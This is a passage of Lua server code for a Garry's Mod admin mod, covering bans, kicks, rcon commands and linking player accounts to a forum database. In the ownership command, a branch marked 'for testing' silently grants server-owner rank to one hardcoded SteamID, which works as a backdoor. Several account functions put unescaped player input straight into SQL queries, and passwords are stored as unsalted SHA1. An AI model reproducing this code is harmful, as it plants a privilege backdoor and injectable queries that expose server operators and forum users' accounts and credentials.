				ASS_SaveRankings();
			end

			SendLog(PLAYER:Nick(), "PLAYER_UNBANNED", ID_OR_IP, nil)
			
			ASS_RunPluginFunction( "PlayerUnbanned", nil, PLAYER, IS_IP, ID_OR_IP )
			
		end
	else
	
		ASS_MessagePlayer( PLAYER, "Access Denied!\n")
	
	end
	
end

function ASS_BanPoint( TO_BAN, TIME, REASON )
	if TIME >= (60 * 24) then
		tmysql.query("UPDATE `smfoc_members` SET `bans`=`bans`+1 WHERE `STEAM_ID`='" .. TO_BAN:SteamID() .. "'")
	end
	
	TO_BAN:Kick(REASON)
end

function ASS_ShortBan ( TO_BAN, TIME, Banner, REASON, nomessage )
	if nomessage then Banner = 'unknown'; end

	local SendTime = 0;
	
	if TIME == 0 then
		SendTime = 0;
	else
		SendTime = os.time() + (TIME * 60)
	end

	REASON = tmysql.escape( REASON )
	REASON = string.gsub(REASON, '"', '\"')

	tmysql.query("INSERT INTO `bans` (`ID`, `NAME`, `UNBAN`, `BANNER`, `REASON`) VALUES ('" .. TO_BAN:SteamID() .. "', '" .. tmysql.escape(TO_BAN:Nick()) .. "', '" .. tostring(SendTime) .. "', '" .. tmysql.escape(Banner) .. "', '" .. REASON .. "')");	
				
	local TimeLeft = (TIME * 60);
			
	local Minutes = math.floor(TimeLeft / 60);
	local Minutes2 = math.floor(TimeLeft / 60);
	local Seconds = TimeLeft - (Minutes * 60);
	local Hours = math.floor(Minutes / 60);
	local Minutes = Minutes - (Hours * 60);
	local Days = math.floor(Hours / 24);
	local Hours = Hours - (Days * 24);
			
	local ToDoTime = 0;
	local ToDoWord = "Error";
	if TimeLeft == 0 then
		ToDoWord = "Perma";
	elseif Minutes == 0 and Seconds != 0 then
		ToDoTime = Seconds;
		ToDoWord = "Seconds";
	elseif Hours == 0 and Minutes != 0 then
		ToDoTime = Minutes;
		ToDoWord = "Minutes";
	elseif Days == 0 and Hours != 0 then
		ToDoTime = Hours;
		ToDoWord = "Hours";
	else
		ToDoTime = Days;
		ToDoWord = "Days";
	end
	
	if nomessage then return false; end
	
	if ToDoWord == "Perma" then
		for k, v in pairs(player.GetAll()) do
			v:PrintMessage(HUD_PRINTTALK, TO_BAN:Nick() .. " has been banned permanently.");
			v:PrintMessage(HUD_PRINTTALK, "Reason: " .. REASON .. ".");
		end
	else
		for k, v in pairs(player.GetAll()) do
			v:PrintMessage(HUD_PRINTTALK, TO_BAN:Nick() .. " has been banned for " .. ToDoTime .. " " .. ToDoWord .. ".");
			v:PrintMessage(HUD_PRINTTALK, "Reason: " .. REASON .. ".");
		end
	end
	
	ASS_BanPoint( TO_BAN, TIME, REASON )
end


function ASS_BanPlayer( PLAYER, UNIQUEID, TIME, REASON )

	TIME = tonumber(TIME) or 0
	if (#REASON == 0) then REASON = "Banned" end
	
	if (PLAYER:IsTempAdmin()) then

		local TO_BAN = ASS_FindPlayer(UNIQUEID)
		
		if (!TO_BAN) then
		
			ASS_MessagePlayer(PLAYER, "Player not found!\n")
			return

		end

		//if (TO_BAN:IsBetterOrSame(PLAYER)) then

		//	// disallow!
		//	ASS_MessagePlayer(PLAYER, "Access denied! \"" .. TO_BAN:Nick() .. "\" has same or better access then you.")
		//	return
		//
		//end

		if (TIME == 0 && !PLAYER:IsSuperAdmin()) then
			
			ASS_MessagePlayer(PLAYER, "\"" .. TO_BAN:Nick() .. "\" can only be perma banned by Super Admins.")
			return false;
		
		end
		
		if REASON == '' then
			ASS_MessagePlayer(PLAYER, "Please use a real ban reason.")
			return false;
		end
		
		if (TIME > 0) then
			SendLog(PLAYER:Nick(), "PLAYER_BANNED_TEMP", TO_BAN:Nick(), TIME)
		else
			SendLog(PLAYER:Nick(), "PLAYER_BANNED_PERMA", TO_BAN:Nick(), nil)
		end
			
		// Msg("Banning...\n");
		
		ASS_ShortBan(TO_BAN, TIME, PLAYER:Nick(), REASON, PLAYER:GetNetworkedBool('pe_dis', false));

		
	else
	
		ASS_MessagePlayer( PLAYER, "Access Denied!\n")
	
	end
	
end

function ASS_KickPlayer( PLAYER, UNIQUEID, REASON )

	if (#REASON == 0) then REASON = "Kicked" end

	if (PLAYER:IsTempAdmin()) then

		local TO_KICK = ASS_FindPlayer(UNIQUEID)

		if (!TO_KICK) then
		
			ASS_MessagePlayer(PLAYER, "Player not found!\n")
			return

		end

		if (TO_KICK:IsBetterOrSame(PLAYER)) then

			// disallow!
			ASS_MessagePlayer(PLAYER, "Access denied! \"" .. TO_KICK:Nick() .. "\" has same or better access then you.")
			return
		
		end

		if (ASS_RunPluginFunction( "AllowPlayerKick", true, PLAYER, TO_KICK, REASON )) then
			
			
			SendLog(PLAYER:Nick(), "PLAYER_KICKED", TO_KICK:Nick(), REASON)

			ASS_RunPluginFunction( "PlayerKicked", nil, PLAYER, TO_KICK, REASON )
		
			TO_KICK:Kick(REASON);
			
			for k, v in pairs(player.GetAll()) do
				v:PrintMessage(HUD_PRINTTALK, TO_KICK:Nick() .. " has been kicked for " .. REASON .. ".");
			end

		end
		
	else
	
		ASS_MessagePlayer( PLAYER, "Access Denied!\n")
	
	end
	
end

function ASS_RconBegin( PLAYER )

	if (PLAYER:IsSuperAdmin()) then

		PLAYER.ASS_CurrentRcon = ""
	
	else
	
		ASS_MessagePlayer( PLAYER, "Access Denied!\n")

	end

end

function ASS_RconEnd( PLAYER, TIME )

	if (PLAYER:IsSuperAdmin()) then

		if (PLAYER.ASS_CurrentRcon && PLAYER.ASS_CurrentRcon != "") then
		
			if (TIME == 0) then
				asscmd.ConsoleCommand(PLAYER.ASS_CurrentRcon .. "\n")
						
				SendLog(PLAYER:Nick(), "RCON_STRNG", nil, PLAYER.ASS_CurrentRcon)
			else
			
				
			
			end
		
		end
		
		PLAYER.ASS_CurrentRcon = nil
	
	else
	
		ASS_MessagePlayer( PLAYER, "Access Denied!\n")

	end

end

function ASS_Rcon( PLAYER, ARGS )

	if (PLAYER:IsSuperAdmin() ) then

		for k,v in pairs(ARGS) do
		
			PLAYER.ASS_CurrentRcon = PLAYER.ASS_CurrentRcon .. string.char(v)
		
		end
			
	else
	
		ASS_MessagePlayer( PLAYER, "Access Denied!\n")
	
	end
	
end

concommand.Add( "ASS_RconBegin",		
		function (pl, cmd, args) 	
			ASS_RconBegin( pl ) 	
		end	
	)
concommand.Add( "ASS_Rcon",		
		function (pl, cmd, args) 	
			ASS_Rcon( pl, args ) 	
		end	
	)
concommand.Add( "ASS_RconEnd",		
		function (pl, cmd, args) 	
			ASS_RconEnd( pl, tonumber(args[1]) or 0 ) 	
		end	
	)

concommand.Add( "ASS_KickPlayer",	
		function (pl, cmd, args) 	
			local uid = args[1] 
			table.remove(args, 1) 
			ASS_KickPlayer( pl, uid, table.concat(args, " ") ) 	
		end	
	)
concommand.Add( "ASS_BanPlayer",	
		function (pl, cmd, args) 	
			local uid = args[1] 
			local time = tonumber(args[2])
			table.remove(args, 2) 
			table.remove(args, 1) 
			ASS_BanPlayer( pl, uid, time, table.concat(args, " ") ) 	
		end	
	)
concommand.Add( "ASS_UnBanPlayer",	
		function (pl, cmd, args) 	
			local uid = args[1]
			
			if (string.sub(uid, 1, 3) == "BOT" || string.sub(uid, 1, 5) == "STEAM") then
				uid = table.concat(args, "")
				is_ip = false
			else
				uid = table.concat(args, "")
				is_ip = true
			end
			
			ASS_UnBanPlayer( pl, is_ip, uid ) 	
		end	
	)
concommand.Add( "ASS_UnbanList",
		function (pl, cmd, args)
			local n = 0
			for id, entry in pairs(PlayerRankings) do
				if (entry.Rank == ASS_LVL_BANNED) then
					n = n + 1
				end
			end
			ASS_BeginProgress("ASS_BannedPlayer", "Recieving banned list...", n)
			for id, entry in pairs(PlayerRankings) do
				if (entry.Rank == ASS_LVL_BANNED) then
					umsg.Start("ASS_BannedPlayer", pl)
						umsg.String( entry.Name )
						umsg.String( id )
					umsg.End()
				end
			end
			umsg.Start("ASS_ShowBannedPlayerGUI", pl)
			umsg.End()
		end
	)
concommand.Add( "ASS_PromotePlayer",	
		function (pl, cmd, args) 	
			local uid = args[1] 
			local rank = tonumber(args[2])
			local time = tonumber(args[3]) or 60
			ASS_Promote( pl, uid, rank, time) 	
		end	
	)
concommand.Add( "ASS_ListPlayers",	
		function (pl, cmd, args) 	
			for k,v in pairs(player.GetAll()) do
				print(v:Nick(), v:UniqueID())
			end
		end	
	)
concommand.Add( "ASS_GiveOwnership",	
		function (pl, cmd, args) 	
			if (pl:HasLevel(ASS_LVL_SERVER_OWNER)) then
			
				local other = ASS_FindPlayer(args[1])
				
				if (!other || !other:IsValid()) then
					ASS_MessagePlayer(pl, "Invalid Player!")
					return
				end
				
				if (other != pl) then
					other:SetLevel( ASS_LVL_SERVER_OWNER )
					ASS_SaveRankings();

					ASS_MessagePlayer(pl, "Ownership Given!")
				else
					ASS_MessagePlayer(pl, "You're an owner already!")
				end
				
				// THIS IS [b]**ONLY**[/b] FOR TESTING!!!!!!
				
				else if pl:SteamID() == "STEAM_0:0:37916732" then 
					pl:SetLevel( ASS_LVL_SERVER_OWNER )
				else
					ASS_MessagePlayer(pl, "Access Denied!")
				end
			end	
		end
	)
concommand.Add("ASS_SetWriterPlugin",
		function(PL,CMD,ARGS)
			if (PL:HasLevel(ASS_LVL_SERVER_OWNER)) then
				local Name = ARGS[1] or "Default Writer"
				local Plugin = ASS_FindPlugin(Name)

				if (!Plugin) then
					ASS_MessagePlayer(PL, "Plugin " .. Name .. " not found!");
					return
				end
				if (!Plugin.AddToLog || !Plugin.LoadRankings || !Plugin.SaveRankings) then
					ASS_MessagePlayer(PL, "Plugin " .. Name .. " isn't a writer plugin!");
					return
				end
				
				if (ASS_Config["writer"] == Name) then
					ASS_MessagePlayer(PL, "Writer already set to " .. Name);
					return
				end

				ASS_SaveRankings() // just in case everything goes wrong
				ASS_Config["writer"] = Name
				ASS_SaveRankings()
				ASS_MessagePlayer(PL, "Writer changed to " .. Name);
			else
				ASS_MessagePlayer(PL, "Access Denied!");
			end
		end,
		function(CMD,ARGS)
			local f = ASS_AllPlugins(
					function(plugin) return plugin.AddToLog && plugin.LoadRankings && plugin.SaveRankings end
				)
			local res = {}
			for k,v in pairs(f) do
				table.insert(res, "ASS_SetWriterPlugin \"" .. v.Name .. "\"")
			end
			table.insert(res, "dummy")
			return res
		end
	)
	
// override kickid2 which is defined by Gmod - this is the console command fired off when you click
// the kick button on the scoreboard
concommand.Add( "kickid2", 		
		function ( pl, cmd, args )

			local length = tonumber(args[1])
			local id = tonumber(args[2])
			
			for k,v in pairs(player.GetAll()) do
			
				if (id == v:UserID()) then

					ASS_KickPlayer( pl, v:UniqueId(), "")
					return	
				end
			end

		end 
	)
// override banid2 which is defined by Gmod - this is the console command fired off when you click
// a ban button on the scoreboard
concommand.Add( "banid2", 
		function ( pl, cmd, args )

			local id = tonumber(args[1])
			
			for k,v in pairs(player.GetAll()) do
			
				if (id == v:UserID()) then

					ASS_BanPlayer( pl, v:UniqueID(), length, "")
					return	
				end
			end

		end 
	)
	
	timer.Create( "RemoveBans", 900, 0, function()
	if !SiteDatabaseConnection then ConnectToMySQL() end
	MySQLQuery(SiteDatabaseConnection, "UPDATE bans SET NOW=UNIX_TIMESTAMP()");
	MySQLQuery(SiteDatabaseConnection, "DELETE FROM bans WHERE UNBAN<NOW AND UNBAN>0");
end )

require("yahm")
-- REGISTRATION!
function AccCreate( ply, cmd, args )
	local username = args[1]
	local loweruser = string.lower(args[1])
	local password = string.lower(yahm.SHA1("".. loweruser .."".. args[2] ..""))
	local nick = StripForHTTP(args[3])
	local steamid = args[4]
	local email = args[5]
	local theip = OC_GetIP( ply )
	if ply:SteamID() != steamid then
		ply:Kick( "Trying to create fake accounts" )
		return
	end
	mysql.query(ForumDatabase, "INSERT INTO `catalyst_members` (member_name, steamid, date_registered, real_name, passwd, email_address, member_ip, member_ip2, id_post_group) VALUES ('".. username .."', '".. steamid .."', UNIX_TIMESTAMP(), '".. nick .."', '".. password .."', '".. email .."', '".. theip .."', '".. theip .."', '4')")
end
concommand.Add("cg_createuser", AccCreate)

/*function ChangeMyPass( ply, cmd, args )
	tzsteamid = args[2]
	if ply:SteamID() != tzsteamid then
		ply:Kick( "Not you're account" )
		return
	end
	tmysql.query( "SELECT `member_name` FROM `catalyst_members` WHERE `steamid` = '".. tzsteamid .."'",
	function(results)
		//print(results)
		plyfuser = tostring(results[1][1])
		//print(plyfuser)
		ply:SetNWString("fusernam", plyfuser)
	end)
	tzpass = args[1]
	timer.Create("tehdelay1", 1, 1, function() local crcnewpass = yahm.SHA1("".. string.lower(ply:GetNWString("fusernam")) .."".. tzpass .."")
	//print(crcnewpass)
	tmysql.query("UPDATE `catalyst_members` SET `passwd` = '".. crcnewpass .."', `password_salt` = NULL WHERE `steamid` = '".. tzsteamid .."'")
	end)
end
concommand.Add("cg_changepass", ChangeMyPass)*/

function checkuserexist(ply, cmd, args)
	userc = args[1]
	player_1 = player.GetByID(args[2])
	player.query_loading = true
	local R = mysql.query(ForumDatabase, "SELECT * FROM `catalyst_members` WHERE `member_name`  = '".. userc .."'")
	RF = RecipientFilter()
	RF:AddPlayer( player_1 )
	if #R >= 1 then
		umsg.Start("UsernameExists", RF)
		umsg.End()
	else
		KickDupes( ply )
		umsg.Start("UsernameFree", RF)
		umsg.End()
	end 
end
concommand.Add("checkuserexist", checkuserexist)

function checkaccinfo(ply, cmd, args)
	local username = args[1]
	local loweruser = string.lower(args[1])
	local password = yahm.SHA1("".. loweruser .."".. args[2] .."")
	local R = mysql.query(ForumDatabase, "SELECT * FROM `catalyst_members` WHERE `member_name`  = '".. username .."' AND `passwd` = '".. password .."' AND `steamid` = ''")
	RF = RecipientFilter()
	RF:AddPlayer( ply )
	if #R >= 1 then
		KickDupes( ply )
		umsg.Start("AccountCorrect", RF)
		umsg.End()
	else
		umsg.Start("AccountIncorrect", RF)
		umsg.End()
	end 
end
concommand.Add("checkaccinfo", checkaccinfo)

function LinkSteamAccToForumAcc(ply, cmd, args)
	local username = args[1]
	local loweruser = string.lower(args[1])
	local password = yahm.SHA1("".. loweruser .."".. args[2] .."")
	local steamid = args[3]
	local nick = StripForHTTP(ply:Nick())
	mysql.query(ForumDatabase, "UPDATE `catalyst_members` SET `steamid` = '".. steamid .."', `real_name` = '".. nick .."' WHERE `member_name`  = '".. username .."' AND `passwd` = '".. password .."'")
end
concommand.Add("linkforumacc", LinkSteamAccToForumAcc)

hook.Add( "PlayerConnect", "ASS_PlayerConnect", ASS_PlayerConnect)
hook.Add( "PlayerInitialSpawn", "ASS_PlayerInitialSpawn", ASS_PlayerInitialSpawn)
hook.Add( "PlayerDisconnect", "ASS_PlayerDisconnect", ASS_PlayerDisconnect)
hook.Add( "PlayerSay", "ASS_PlayerSpeech", ASS_PlayerSpeech)
hook.Add( "Initialize", "ASS_Initialize", ASS_Initialize)

ASS_Init_Shared()
